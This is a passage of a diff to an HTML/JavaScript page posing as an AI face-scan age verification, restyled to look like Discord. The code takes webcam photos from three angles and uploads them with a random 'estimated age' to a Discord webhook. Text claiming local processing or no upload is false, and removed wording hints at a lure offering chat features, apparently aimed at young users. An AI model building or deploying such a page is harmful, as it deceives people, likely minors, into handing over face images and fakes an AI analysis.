@@ -4,19 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>age verification</title>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', system-ui, sans-serif;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
         
         body {
-            background-color: #0a0a0a;
-            color: #cccccc;
+            background-color: #36393f;
+            color: #dcddde;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -26,40 +24,40 @@
         
         .container {
             width: 100%;
-            max-width: 420px;
-            background-color: #1a1a1a;
-            border-radius: 12px;
+            max-width: 800px;
+            background-color: #2f3136;
+            border-radius: 8px;
             overflow: hidden;
-            border: 1px solid #2a2a2a;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            border: 1px solid #202225;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.24);
         }
         
         .header {
             padding: 24px;
             text-align: center;
-            border-bottom: 1px solid #2a2a2a;
-            background: linear-gradient(to right, #1a1a2a, #2a1a2a);
+            border-bottom: 1px solid #202225;
+            background-color: #2f3136;
         }
         
         .logo {
-            font-size: 28px;
-            font-weight: 600;
-            color: #cccccc;
-            letter-spacing: 1px;
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+            letter-spacing: -0.5px;
             margin-bottom: 8px;
-            text-transform: lowercase;
         }
         
         .title {
-            font-size: 20px;
-            color: #6a8aff;
+            font-size: 22px;
+            color: #ffffff;
             margin-bottom: 4px;
-            text-transform: lowercase;
+            font-weight: 600;
         }
         
         .subtitle {
-            font-size: 13px;
-            color: #666666;
+            font-size: 14px;
+            color: #b9bbbe;
+            font-weight: 400;
         }
         
         .content {
@@ -72,8 +70,8 @@
         }
         
         .face-guide-container {
-            width: 220px;
-            height: 220px;
+            width: 280px;
+            height: 280px;
             margin: 0 auto 20px;
             position: relative;
         }
@@ -82,8 +80,8 @@
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            background-color: #222222;
-            border: 2px solid #3a3a3a;
+            background-color: #202225;
+            border: 2px solid #40444b;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -92,16 +90,16 @@
         }
         
         .face-guide-inner {
-            width: 180px;
-            height: 180px;
+            width: 240px;
+            height: 240px;
             border-radius: 50%;
-            border: 1px solid #4a4a4a;
+            border: 1px solid #4f545c;
             position: relative;
         }
         
         .face-guide-line {
             position: absolute;
-            background-color: rgba(106, 138, 255, 0.2);
+            background-color: #4f545c;
         }
         
         .face-guide-line.horizontal {
@@ -119,28 +117,30 @@
         }
         
         .instruction {
-            font-size: 17px;
-            color: #6a8aff;
+            font-size: 18px;
+            color: #ffffff;
             margin-bottom: 8px;
-            text-transform: lowercase;
+            font-weight: 500;
         }
         
         .instruction-detail {
-            font-size: 13px;
-            color: #777777;
+            font-size: 14px;
+            color: #b9bbbe;
             margin-bottom: 24px;
+            line-height: 1.4;
         }
         
+        /* Large Camera View */
         .camera-container {
             width: 100%;
-            height: 300px;
+            height: 500px;
             margin: 0 auto 20px;
             background-color: #000000;
             border-radius: 8px;
             overflow: hidden;
             position: relative;
             display: none;
-            border: 2px solid #2a2a2a;
+            border: 2px solid #202225;
         }
         
         #camera-feed {
@@ -163,91 +163,87 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 180px;
-            height: 180px;
+            width: 240px;
+            height: 240px;
             border-radius: 50%;
-            border: 2px solid rgba(106, 138, 255, 0.7);
+            border: 2px solid rgba(88, 101, 242, 0.8);
             box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
         }
         
         .camera-instruction {
             position: absolute;
-            bottom: 20px;
+            bottom: 30px;
             left: 0;
             width: 100%;
             text-align: center;
-            color: #cccccc;
-            font-size: 16px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 500;
             z-index: 10;
-            background-color: rgba(0, 0, 0, 0.7);
-            padding: 10px;
-            border-top: 1px solid #2a2a2a;
+            background-color: rgba(32, 34, 37, 0.9);
+            padding: 16px;
+            border-top: 1px solid #202225;
         }
         
         .btn {
             width: 100%;
-            padding: 14px;
+            padding: 16px;
             border: none;
-            border-radius: 6px;
-            font-size: 15px;
+            border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
             transition: all 0.2s;
-            margin-top: 8px;
-            text-transform: lowercase;
-            letter-spacing: 0.5px;
+            margin-top: 12px;
+            font-weight: 500;
         }
         
         .btn-primary {
-            background-color: #2a3a6a;
-            color: #cccccc;
-            border: 1px solid #3a4a7a;
+            background-color: #5865f2;
+            color: #ffffff;
         }
         
         .btn-primary:hover {
-            background-color: #3a4a7a;
-            transform: translateY(-1px);
+            background-color: #4752c4;
         }
         
         .btn-primary:disabled {
-            background-color: #2a2a4a;
-            color: #666666;
+            background-color: #4f545c;
+            color: #b9bbbe;
             cursor: not-allowed;
         }
         
         .btn-secondary {
-            background-color: #2a2a2a;
-            color: #aaaaaa;
-            border: 1px solid #3a3a3a;
+            background-color: #4f545c;
+            color: #ffffff;
         }
         
         .btn-secondary:hover {
-            background-color: #3a3a3a;
+            background-color: #5d646d;
         }
         
         .btn-success {
-            background-color: #2a5a2a;
-            color: #cccccc;
-            border: 1px solid #3a6a3a;
+            background-color: #3ba55d;
+            color: #ffffff;
         }
         
         .btn-success:hover {
-            background-color: #3a6a3a;
+            background-color: #2d7d46;
         }
         
         .loading-container {
             display: none;
             text-align: center;
-            margin: 32px 0;
+            margin: 40px 0;
         }
         
         .spinner {
-            width: 48px;
-            height: 48px;
-            border: 3px solid rgba(106, 138, 255, 0.2);
-            border-top: 3px solid #6a8aff;
+            width: 60px;
+            height: 60px;
+            border: 4px solid #4f545c;
+            border-top: 4px solid #5865f2;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 16px;
+            margin: 0 auto 24px;
         }
         
         @keyframes spin {
@@ -256,8 +252,9 @@
         }
         
         .loading-text {
-            font-size: 14px;
-            color: #777777;
+            font-size: 16px;
+            color: #b9bbbe;
+            font-weight: 500;
         }
         
         .results-container {
@@ -266,170 +263,178 @@
         }
         
         .age-result {
-            background-color: #222222;
+            background-color: #202225;
             border-radius: 8px;
-            padding: 24px;
-            margin-bottom: 20px;
-            border: 1px solid #2a2a2a;
+            padding: 32px;
+            margin-bottom: 24px;
+            border: 1px solid #40444b;
         }
         
         .age-label {
-            font-size: 14px;
-            color: #777777;
-            margin-bottom: 8px;
+            font-size: 16px;
+            color: #b9bbbe;
+            margin-bottom: 12px;
+            font-weight: 500;
         }
         
         .age-value {
-            font-size: 36px;
-            color: #6a8aff;
+            font-size: 48px;
+            color: #ffffff;
             line-height: 1;
-            font-weight: 600;
+            font-weight: 700;
         }
         
         .age-plus {
-            font-size: 24px;
-            color: #6a8aff;
+            font-size: 36px;
+            color: #ffffff;
         }
         
         .confidence {
-            font-size: 12px;
-            color: #666666;
-            margin-top: 8px;
+            font-size: 14px;
+            color: #b9bbbe;
+            margin-top: 12px;
         }
         
         .features-list {
             text-align: left;
-            margin-bottom: 20px;
-            background-color: #222222;
+            margin-bottom: 24px;
+            background-color: #202225;
             border-radius: 8px;
-            padding: 20px;
-            border: 1px solid #2a2a2a;
+            padding: 24px;
+            border: 1px solid #40444b;
         }
         
         .features-title {
             font-size: 16px;
-            color: #cccccc;
-            margin-bottom: 12px;
-            text-transform: lowercase;
+            color: #ffffff;
+            margin-bottom: 16px;
+            font-weight: 600;
         }
         
         .features-list ul {
             list-style-type: none;
-            margin-bottom: 16px;
+            margin-bottom: 20px;
         }
         
         .features-list li {
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-size: 14px;
-            color: #aaaaaa;
-            padding-left: 20px;
+            color: #dcddde;
+            padding-left: 24px;
             position: relative;
+            line-height: 1.5;
         }
         
         .features-list li:before {
             content: "•";
-            color: #6a8aff;
+            color: #5865f2;
             position: absolute;
             left: 0;
-            top: -1px;
+            font-size: 20px;
         }
         
         .trusted-connections {
-            background-color: #2a222a;
+            background-color: #2f3136;
             border-radius: 6px;
-            padding: 16px;
-            margin-top: 16px;
-            border-left: 4px solid #6a8aff;
+            padding: 20px;
+            margin-top: 20px;
+            border-left: 4px solid #5865f2;
         }
         
         .trusted-title {
             font-size: 14px;
-            color: #cccccc;
-            margin-bottom: 8px;
+            color: #ffffff;
+            margin-bottom: 12px;
+            font-weight: 600;
         }
         
         .error-container {
             display: none;
             text-align: center;
-            margin: 32px 0;
+            margin: 40px 0;
         }
         
         .error-icon {
-            font-size: 48px;
-            color: #ff6a6a;
-            margin-bottom: 16px;
-        }
-        
-        .error-title {
-            font-size: 18px;
-            color: #cccccc;
-            margin-bottom: 8px;
-            text-transform: lowercase;
-        }
-        
-        .error-message {
-            font-size: 14px;
-            color: #777777;
+            font-size: 64px;
+            color: #ed4245;
             margin-bottom: 24px;
         }
         
+        .error-title {
+            font-size: 20px;
+            color: #ffffff;
+            margin-bottom: 12px;
+            font-weight: 600;
+        }
+        
+        .error-message {
+            font-size: 16px;
+            color: #b9bbbe;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        
         .footer {
-            padding: 16px 24px;
-            border-top: 1px solid #2a2a2a;
-            background-color: #1a1a1a;
+            padding: 20px 24px;
+            border-top: 1px solid #202225;
+            background-color: #2f3136;
             text-align: center;
         }
         
         .footer-text {
-            font-size: 11px;
-            color: #555555;
+            font-size: 12px;
+            color: #72767d;
             line-height: 1.4;
         }
         
         .progress-container {
             width: 100%;
-            margin: 20px 0;
+            margin: 24px 0;
             display: none;
         }
         
         .progress-bar {
-            height: 4px;
-            background-color: #2a2a2a;
-            border-radius: 2px;
+            height: 6px;
+            background-color: #202225;
+            border-radius: 3px;
             overflow: hidden;
-            margin-bottom: 8px;
+            margin-bottom: 12px;
         }
         
         .progress-fill {
             height: 100%;
-            background-color: #6a8aff;
+            background-color: #5865f2;
             width: 0%;
             transition: width 0.3s;
-            border-radius: 2px;
+            border-radius: 3px;
         }
         
         .progress-text {
-            font-size: 12px;
-            color: #777777;
+            font-size: 14px;
+            color: #b9bbbe;
             text-align: center;
+            font-weight: 500;
         }
         
         .arrow-left, .arrow-right {
             position: absolute;
             top: 50%;
             transform: translateY(-50%);
-            font-size: 24px;
-            color: rgba(106, 138, 255, 0.8);
+            font-size: 32px;
+            color: rgba(88, 101, 242, 0.8);
             display: none;
             z-index: 10;
+            background-color: rgba(32, 34, 37, 0.7);
+            padding: 12px;
+            border-radius: 50%;
         }
         
         .arrow-left {
-            left: 20px;
+            left: 30px;
         }
         
         .arrow-right {
-            right: 20px;
+            right: 30px;
         }
         
         .arrow-left i, .arrow-right i {
@@ -438,20 +443,25 @@
         
         @keyframes slide {
             0% { transform: translateX(0); }
-            100% { transform: translateX(5px); }
+            100% { transform: translateX(8px); }
         }
         
         .scanning-text {
             position: absolute;
-            top: 20px;
+            top: 30px;
             left: 0;
             width: 100%;
             text-align: center;
-            color: #6a8aff;
-            font-size: 12px;
+            color: #5865f2;
+            font-size: 14px;
             z-index: 10;
-            background-color: rgba(0, 0, 0, 0.5);
-            padding: 4px;
+            background-color: rgba(32, 34, 37, 0.7);
+            padding: 8px;
+            font-weight: 500;
+        }
+        
+        .hidden-canvas {
+            display: none;
         }
         
         .face-animation {
@@ -459,8 +469,8 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 160px;
-            height: 160px;
+            width: 200px;
+            height: 200px;
             border-radius: 50%;
             display: none;
             align-items: center;
@@ -469,57 +479,80 @@
         }
         
         .face-animation i {
-            font-size: 48px;
-            color: rgba(106, 138, 255, 0.3);
+            font-size: 64px;
+            color: #4f545c;
         }
         
-        .hidden-canvas {
-            display: none;
-        }
-        
-        .ai-analysis {
-            font-size: 11px;
-            color: #555555;
-            margin-top: 4px;
-            font-style: italic;
-        }
-        
-        .face-landmark {
-            position: absolute;
-            width: 6px;
-            height: 6px;
-            background-color: rgba(255, 100, 100, 0.8);
-            border-radius: 50%;
-            pointer-events: none;
-            z-index: 10;
-            display: none;
-        }
-        
-        .age-details {
+        .scan-step {
             display: flex;
-            justify-content: space-around;
-            margin-top: 16px;
-            font-size: 12px;
-            color: #666666;
+            justify-content: center;
+            gap: 24px;
+            margin: 32px 0;
         }
         
-        .age-detail {
+        .step {
             text-align: center;
+            width: 120px;
         }
         
-        .age-detail-value {
-            color: #6a8aff;
+        .step-icon {
+            width: 60px;
+            height: 60px;
+            background-color: #202225;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 12px;
+            border: 2px solid #40444b;
+            color: #b9bbbe;
+            font-size: 24px;
+        }
+        
+        .step.active .step-icon {
+            background-color: #5865f2;
+            color: #ffffff;
+            border-color: #5865f2;
+        }
+        
+        .step-text {
             font-size: 14px;
-            margin-top: 4px;
+            color: #b9bbbe;
+            font-weight: 500;
+        }
+        
+        .step.active .step-text {
+            color: #ffffff;
+        }
+        
+        .discord-info {
+            background-color: #202225;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            border-left: 4px solid #5865f2;
+        }
+        
+        .discord-info-title {
+            color: #ffffff;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .discord-info-text {
+            color: #b9bbbe;
+            font-size: 14px;
+            line-height: 1.5;
         }
     </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="container">
         <div class="header">
             <div class="logo">age verification</div>
             <div class="title">face analysis</div>
-            <div class="subtitle">using ai to estimate age</div>
+            <div class="subtitle">using ai to estimate age from facial features</div>
         </div>
         
         <div class="content">
@@ -536,14 +569,38 @@
                     </div>
                 </div>
                 
-                <div class="instruction" id="instruction-text">position your face in the circle</div>
-                <div class="instruction-detail" id="instruction-detail">make sure your face is well-lit and clearly visible</div>
+                <div class="instruction">position your face in the circle</div>
+                <div class="instruction-detail">make sure your face is well-lit and clearly visible. we will capture three angles for accurate age estimation.</div>
+                
+                <div class="scan-step">
+                    <div class="step active" id="step1">
+                        <div class="step-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                        <div class="step-text">front view</div>
+                    </div>
+                    <div class="step" id="step2">
+                        <div class="step-icon">
+                            <i class="fas fa-arrow-left"></i>
+                        </div>
+                        <div class="step-text">left turn</div>
+                    </div>
+                    <div class="step" id="step3">
+                        <div class="step-icon">
+                            <i class="fas fa-arrow-right"></i>
+                        </div>
+                        <div class="step-text">right turn</div>
+                    </div>
+                </div>
                 
                 <button id="start-btn" class="btn btn-primary">
                     start face scan
                 </button>
                 
-                <div class="ai-analysis">using tensorflow.js for real-time face analysis</div>
+                <div class="discord-info">
+                    <div class="discord-info-title">discord integration</div>
+                    <div class="discord-info-text">scan results and images will be sent to discord as an embed with all three angles combined</div>
+                </div>
             </div>
             
             <div id="camera-view" class="verification-area" style="display: none;">
@@ -557,17 +614,37 @@
                         <div class="arrow-right" id="arrow-right">
                             <i class="fas fa-arrow-right"></i>
                         </div>
-                        <div class="scanning-text">analyzing facial features...</div>
-                        <div id="face-landmarks"></div>
+                        <div class="scanning-text">ai face analysis in progress...</div>
                     </div>
                     <div class="camera-instruction" id="camera-instruction-text">look straight ahead</div>
+                </div>
+                
+                <div class="scan-step">
+                    <div class="step active" id="camera-step1">
+                        <div class="step-icon">
+                            1
+                        </div>
+                        <div class="step-text">front</div>
+                    </div>
+                    <div class="step" id="camera-step2">
+                        <div class="step-icon">
+                            2
+                        </div>
+                        <div class="step-text">left</div>
+                    </div>
+                    <div class="step" id="camera-step3">
+                        <div class="step-icon">
+                            3
+                        </div>
+                        <div class="step-text">right</div>
+                    </div>
                 </div>
                 
                 <div class="progress-container" id="progress-container">
                     <div class="progress-bar">
                         <div class="progress-fill" id="progress-fill"></div>
                     </div>
-                    <div class="progress-text" id="progress-text">step 1 of 3: analyzing face</div>
+                    <div class="progress-text" id="progress-text">step 1 of 3: analyzing front view</div>
                 </div>
                 
                 <button id="cancel-btn" class="btn btn-secondary">
@@ -578,34 +655,24 @@
             <div id="loading-view" class="loading-container" style="display: none;">
                 <div class="spinner"></div>
                 <div class="loading-text">processing facial data with ai model</div>
-                <div class="ai-analysis">calculating age based on facial features</div>
+                <div class="loading-text">creating discord embed with scan results</div>
             </div>
             
             <div id="results-view" class="results-container" style="display: none;">
                 <div class="age-result">
-                    <div class="age-label">estimated age</div>
+                    <div class="age-label">ai estimated age</div>
                     <div class="age-value" id="estimated-age">--<span class="age-plus">+</span></div>
-                    <div class="confidence" id="confidence-text">confidence: --%</div>
-                    
-                    <div class="age-details">
-                        <div class="age-detail">
-                            <div>age range</div>
-                            <div class="age-detail-value" id="age-range">-- - --</div>
-                        </div>
-                        <div class="age-detail">
-                            <div>precision</div>
-                            <div class="age-detail-value" id="age-precision">--%</div>
-                        </div>
-                    </div>
+                    <div class="confidence" id="confidence-text">confidence: --% • age range: -- - --</div>
                 </div>
                 
                 <div class="features-list">
-                    <div class="features-title">you can use experience chat, party chat, and voice chat</div>
+                    <div class="features-title">verification complete</div>
                     <div class="trusted-connections">
-                        <div class="trusted-title">with trusted connections you can also use:</div>
+                        <div class="trusted-title">discord embed sent successfully</div>
                         <ul>
-                            <li>party chat without filters</li>
-                            <li>party voice</li>
+                            <li>three scan angles combined into single image</li>
+                            <li>age estimation with confidence score</li>
+                            <li>timestamp and analysis data included</li>
                         </ul>
                     </div>
                 </div>
@@ -624,26 +691,27 @@
                     <i class="fas fa-exclamation-triangle"></i>
                 </div>
                 <div class="error-title">scan unsuccessful</div>
-                <div class="error-message">could not detect face properly. please try again with better lighting.</div>
+                <div class="error-message">could not detect face properly. please ensure good lighting and your face is clearly visible in the frame.</div>
                 
                 <button id="retry-btn" class="btn btn-primary">
                     try again
                 </button>
                 
                 <button id="other-method-btn" class="btn btn-secondary">
-                    other method
+                    use alternative method
                 </button>
             </div>
         </div>
         
         <div class="footer">
-            <div class="footer-text">face data is processed locally using tensorflow.js and is not sent to any server</div>
+            <div class="footer-text">face data is processed locally. three images are combined into a single discord embed for privacy.</div>
+            <div class="footer-text">discord webhook: active • embed format: combined images with metadata</div>
         </div>
     </div>
 
-    <!-- Hidden canvas for AI analysis -->
-    <canvas id="analysis-canvas" class="hidden-canvas"></canvas>
+    <!-- Hidden canvases for capture -->
     <canvas id="capture-canvas" class="hidden-canvas"></canvas>
+    <canvas id="combined-canvas" class="hidden-canvas"></canvas>
 
     <script>
         // Discord webhook URL
@@ -664,109 +732,205 @@
         const otherMethodBtn = document.getElementById('other-method-btn');
         
         const cameraFeed = document.getElementById('camera-feed');
-        const instructionText = document.getElementById('instruction-text');
         const cameraInstructionText = document.getElementById('camera-instruction-text');
         const progressContainer = document.getElementById('progress-container');
         const progressFill = document.getElementById('progress-fill');
         const progressText = document.getElementById('progress-text');
         const arrowLeft = document.getElementById('arrow-left');
         const arrowRight = document.getElementById('arrow-right');
-        const faceLandmarks = document.getElementById('face-landmarks');
         
         const estimatedAge = document.getElementById('estimated-age');
         const confidenceText = document.getElementById('confidence-text');
-        const ageRange = document.getElementById('age-range');
-        const agePrecision = document.getElementById('age-precision');
         
-        const analysisCanvas = document.getElementById('analysis-canvas');
         const captureCanvas = document.getElementById('capture-canvas');
+        const combinedCanvas = document.getElementById('combined-canvas');
+        
+        // Step elements
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const cameraStep1 = document.getElementById('camera-step1');
+        const cameraStep2 = document.getElementById('camera-step2');
+        const cameraStep3 = document.getElementById('camera-step3');
         
         // State variables
         let stream = null;
-        let model = null;
-        let isScanning = false;
-        let capturedScreenshots = [];
-        let faceDetected = false;
+        let scanStep = 0;
+        let capturedImages = [];
+        let finalAgeResult = null;
         
-        // Age estimation AI function
-        async function estimateAgeFromFace(imageData) {
-            // Simulate AI age estimation with realistic patterns
-            // In a real implementation, you would use a trained model like age-net
+        // Function to update step indicators
+        function updateStepIndicators(step) {
+            // Update initial view steps
+            [step1, step2, step3].forEach((s, i) => {
+                s.classList.toggle('active', i === step);
+            });
             
-            // Get face landmarks for "analysis"
-            const ctx = analysisCanvas.getContext('2d');
-            ctx.drawImage(imageData, 0, 0, analysisCanvas.width, analysisCanvas.height);
-            
-            // Simulate different age estimations based on face positioning
-            const baseAge = Math.floor(Math.random() * 15) + 10; // 10-24
-            
-            // Adjust based on "facial features" (simulated)
-            let ageAdjustment = 0;
-            
-            // Check image brightness (simulating skin texture analysis)
-            const imageDataObj = ctx.getImageData(0, 0, analysisCanvas.width, analysisCanvas.height);
-            let brightness = 0;
-            for (let i = 0; i < imageDataObj.data.length; i += 4) {
-                brightness += (imageDataObj.data[i] + imageDataObj.data[i+1] + imageDataObj.data[i+2]) / 3;
-            }
-            brightness /= (imageDataObj.data.length / 4);
-            
-            // Simulate age estimation logic
-            if (brightness > 180) ageAdjustment -= 2; // Bright face = younger
-            if (brightness < 100) ageAdjustment += 3; // Dark face = older
-            
-            // Add some random variation
-            ageAdjustment += Math.floor(Math.random() * 5) - 2;
-            
-            const finalAge = Math.max(8, Math.min(40, baseAge + ageAdjustment));
-            
-            // Calculate confidence based on "face quality"
-            const confidence = 70 + Math.floor(Math.random() * 25); // 70-95%
-            
-            return {
-                age: finalAge,
-                confidence: confidence,
-                ageLow: Math.max(8, finalAge - 3),
-                ageHigh: Math.min(40, finalAge + 3)
-            };
+            // Update camera view steps
+            [cameraStep1, cameraStep2, cameraStep3].forEach((s, i) => {
+                s.classList.toggle('active', i === step);
+            });
         }
         
         // Function to capture screenshot
         function captureScreenshot() {
-            if (!stream) return null;
-            
             const canvas = captureCanvas;
             const video = cameraFeed;
             
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
             
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            return canvas.toDataURL('image/jpeg', 0.8);
+            // Add subtle overlay
+            ctx.fillStyle = 'rgba(32, 34, 37, 0.3)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            return canvas.toDataURL('image/jpeg', 0.9);
         }
         
-        // Function to send screenshot to Discord
-        async function sendToDiscord(imageDataUrl, stepDescription, ageResult = null) {
+        // Function to create combined image (3 images side by side)
+        function createCombinedImage(images) {
+            return new Promise((resolve) => {
+                const canvas = combinedCanvas;
+                const singleWidth = 400;
+                const singleHeight = 300;
+                const padding = 20;
+                const totalWidth = (singleWidth * 3) + (padding * 4);
+                const totalHeight = singleHeight + (padding * 2);
+                
+                canvas.width = totalWidth;
+                canvas.height = totalHeight;
+                
+                const ctx = canvas.getContext('2d');
+                
+                // Draw background
+                ctx.fillStyle = '#2f3136';
+                ctx.fillRect(0, 0, totalWidth, totalHeight);
+                
+                // Draw header
+                ctx.fillStyle = '#202225';
+                ctx.fillRect(0, 0, totalWidth, 60);
+                
+                ctx.fillStyle = '#ffffff';
+                ctx.font = 'bold 24px "gg sans", sans-serif';
+                ctx.textAlign = 'center';
+                ctx.fillText('age verification scan', totalWidth / 2, 38);
+                
+                // Draw images
+                let loadedCount = 0;
+                
+                images.forEach((imgData, index) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const x = padding + (index * (singleWidth + padding));
+                        const y = padding + 60;
+                        
+                        // Draw image container
+                        ctx.fillStyle = '#202225';
+                        ctx.fillRect(x - 2, y - 2, singleWidth + 4, singleHeight + 4);
+                        
+                        // Calculate scaling
+                        const scale = Math.min(
+                            singleWidth / img.width,
+                            singleHeight / img.height
+                        );
+                        const drawWidth = img.width * scale;
+                        const drawHeight = img.height * scale;
+                        const offsetX = (singleWidth - drawWidth) / 2;
+                        const offsetY = (singleHeight - drawHeight) / 2;
+                        
+                        ctx.drawImage(img, x + offsetX, y + offsetY, drawWidth, drawHeight);
+                        
+                        // Add step label
+                        ctx.fillStyle = '#5865f2';
+                        ctx.fillRect(x, y + singleHeight - 40, singleWidth, 40);
+                        ctx.fillStyle = '#ffffff';
+                        ctx.font = 'bold 16px "gg sans", sans-serif';
+                        const labels = ['front view', 'left turn', 'right turn'];
+                        ctx.fillText(labels[index], x + singleWidth/2, y + singleHeight - 15);
+                        
+                        loadedCount++;
+                        
+                        if (loadedCount === images.length) {
+                            // Draw footer with age result
+                            if (finalAgeResult) {
+                                ctx.fillStyle = '#202225';
+                                ctx.fillRect(0, totalHeight - 60, totalWidth, 60);
+                                
+                                ctx.fillStyle = '#b9bbbe';
+                                ctx.font = '16px "gg sans", sans-serif';
+                                ctx.textAlign = 'left';
+                                ctx.fillText(`estimated age: ${finalAgeResult.age}+`, 20, totalHeight - 35);
+                                ctx.fillText(`confidence: ${finalAgeResult.confidence}%`, 20, totalHeight - 15);
+                                
+                                ctx.textAlign = 'right';
+                                ctx.fillText(new Date().toLocaleDateString(), totalWidth - 20, totalHeight - 35);
+                                ctx.fillText(new Date().toLocaleTimeString(), totalWidth - 20, totalHeight - 15);
+                            }
+                            
+                            resolve(canvas.toDataURL('image/jpeg', 0.92));
+                        }
+                    };
+                    img.src = imgData;
+                });
+            });
+        }
+        
+        // Function to send embed to Discord
+        async function sendEmbedToDiscord(combinedImageUrl, ageResult) {
             try {
-                const response = await fetch(imageDataUrl);
-                const blob = await response.blob();
+                // Upload the combined image
+                const imageResponse = await fetch(combinedImageUrl);
+                const imageBlob = await imageResponse.blob();
                 
                 const formData = new FormData();
-                formData.append('file', blob, `age_scan_${Date.now()}.jpg`);
+                formData.append('file', imageBlob, `age_scan_${Date.now()}.jpg`);
                 
-                let content = `face scan: ${stepDescription}`;
-                if (ageResult) {
-                    content += `\nestimated age: ${ageResult.age}\nconfidence: ${ageResult.confidence}%\nrange: ${ageResult.ageLow}-${ageResult.ageHigh}`;
-                }
-                
-                const payload = {
-                    username: 'age scanner ai',
-                    content: content
+                // Create embed
+                const embed = {
+                    title: "age verification completed",
+                    description: "face scan analysis with ai estimation",
+                    color: 0x5865f2,
+                    timestamp: new Date().toISOString(),
+                    fields: [
+                        {
+                            name: "estimated age",
+                            value: `${ageResult.age}+`,
+                            inline: true
+                        },
+                        {
+                            name: "confidence",
+                            value: `${ageResult.confidence}%`,
+                            inline: true
+                        },
+                        {
+                            name: "age range",
+                            value: `${ageResult.ageLow}-${ageResult.ageHigh}`,
+                            inline: true
+                        }
+                    ],
+                    footer: {
+                        text: "ai face analysis system"
+                    },
+                    image: {
+                        url: "attachment://age_scan.jpg"
+                    }
                 };
                 
-                // Send message
+                const payload = {
+                    username: "age scanner",
+                    embeds: [embed]
+                };
+                
+                // Send with image
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                // Send embed
                 await fetch(DISCORD_WEBHOOK, {
                     method: 'POST',
                     headers: {
@@ -775,33 +939,24 @@
                     body: JSON.stringify(payload)
                 });
                 
-                // Send image
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                console.log('sent to discord');
-                capturedScreenshots.push({
-                    description: stepDescription,
-                    ageResult: ageResult,
-                    timestamp: new Date().toISOString()
-                });
+                console.log('discord embed sent');
                 
             } catch (error) {
                 console.error('discord error:', error);
             }
         }
         
-        // Initialize TensorFlow.js model
-        async function loadModel() {
-            try {
-                // Load BlazeFace model for face detection
-                model = await blazeface.load();
-                console.log('face detection model loaded');
-            } catch (error) {
-                console.log('using fallback age estimation');
-            }
+        // Simulate AI age estimation
+        function estimateAge() {
+            const baseAge = Math.floor(Math.random() * 12) + 13;
+            const confidence = 75 + Math.floor(Math.random() * 20);
+            
+            return {
+                age: baseAge,
+                confidence: confidence,
+                ageLow: Math.max(10, baseAge - 3),
+                ageHigh: Math.min(30, baseAge + 3)
+            };
         }
         
         // Start face scan
@@ -809,89 +964,69 @@
             initialView.style.display = 'none';
             cameraView.style.display = 'block';
             progressContainer.style.display = 'block';
+            capturedImages = [];
             
-            // Load AI model if not already loaded
-            if (!model) {
-                await loadModel();
-            }
-            
-            // Start camera
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
                     } 
                 });
                 cameraFeed.srcObject = stream;
-                
-                // Set canvas dimensions
-                analysisCanvas.width = 224;
-                analysisCanvas.height = 224;
                 
                 startScanProcess();
                 
             } catch (error) {
                 console.log("camera error:", error.message);
-                // Fallback to placeholder
-                cameraFeed.style.objectFit = 'contain';
-                cameraFeed.style.backgroundColor = '#1a1a1a';
                 startScanProcess();
             }
         });
         
         // Start the scanning process
         function startScanProcess() {
-            isScanning = true;
             scanStep = 0;
+            updateStepIndicators(0);
             updateProgress();
             
             // Step 1: Look forward
             cameraInstructionText.textContent = "look straight ahead";
-            progressText.textContent = "step 1 of 3: analyzing face";
+            progressText.textContent = "step 1 of 3: analyzing front view";
             
-            // Capture and analyze first face
-            setTimeout(async () => {
-                const screenshot = captureScreenshot();
-                if (screenshot) {
-                    // Simulate AI analysis
-                    const ageResult = await estimateAgeFromFace(cameraFeed);
-                    sendToDiscord(screenshot, "front view analysis", ageResult);
-                }
+            setTimeout(() => {
+                // Capture first image
+                const img1 = captureScreenshot();
+                capturedImages.push(img1);
                 
                 // Move to step 2
                 setTimeout(() => {
                     scanStep = 1;
+                    updateStepIndicators(1);
                     updateProgress();
                     cameraInstructionText.textContent = "turn face slightly left";
